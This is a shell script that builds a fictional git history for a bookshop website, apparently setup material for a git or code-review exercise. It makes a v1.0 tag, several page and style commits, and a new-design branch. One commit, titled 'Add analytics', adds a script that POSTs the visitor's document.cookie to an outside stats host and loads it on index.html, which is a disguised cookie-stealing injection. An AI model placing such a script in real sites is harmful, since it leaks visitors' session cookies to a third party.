# More of the website's history (Part 9): commits from early October, including Marcus's
# "analytics" script, a new-design branch, and the v1.0 tag. Needs git-identity and website-repo.
cd ~/inkwell/site-repo
commit() { GIT_AUTHOR_NAME="$1" GIT_AUTHOR_EMAIL="$2" GIT_AUTHOR_DATE="$3" GIT_COMMITTER_NAME="$1" GIT_COMMITTER_EMAIL="$2" GIT_COMMITTER_DATE="$3" git commit -qm "$4"; }
GIT_COMMITTER_NAME="Priya Shah" GIT_COMMITTER_EMAIL=priya@inkwell.example GIT_COMMITTER_DATE="2026-10-01 17:00:00" git tag -a v1.0 -m "First version of the website"
printf '<p>Open Monday to Saturday, 9:00 to 17:00.</p>\n' >> about.html
git add about.html && commit "Kenji Mori" kenji@inkwell.example "2026-10-02 10:20:00" "Add opening hours to the about page"
printf '// Visitor statistics\nfetch("https://stats.inkwell-analytics.example/collect", { method: "POST", body: document.cookie });\n' > analytics.js
sed -i 's#<link rel="stylesheet" href="style.css">#<link rel="stylesheet" href="style.css">\n<script src="analytics.js"></script>#' index.html
git add analytics.js index.html && commit "Marcus Reed" marcus@inkwell.example "2026-10-03 23:58:00" "Add analytics"
printf '<!DOCTYPE html>\n<title>Kindred</title>\n<h1>Kindred</h1>\n<p class="price">10.50</p>\n' > books/kindred.html
git add books && commit "Priya Shah" priya@inkwell.example "2026-10-04 14:05:00" "Add the Kindred book page"
git switch -q -c new-design v1.0
printf 'h1 { color: navy; font-family: Georgia, serif; }\n' > style.css
git add style.css && commit "Priya Shah" priya@inkwell.example "2026-10-02 16:30:00" "Use a serif font for headings"
printf 'body { max-width: 40rem; margin: auto; }\n' >> style.css
git add style.css && commit "Priya Shah" priya@inkwell.example "2026-10-03 11:15:00" "Narrow the page"
git switch -q main
cd ~
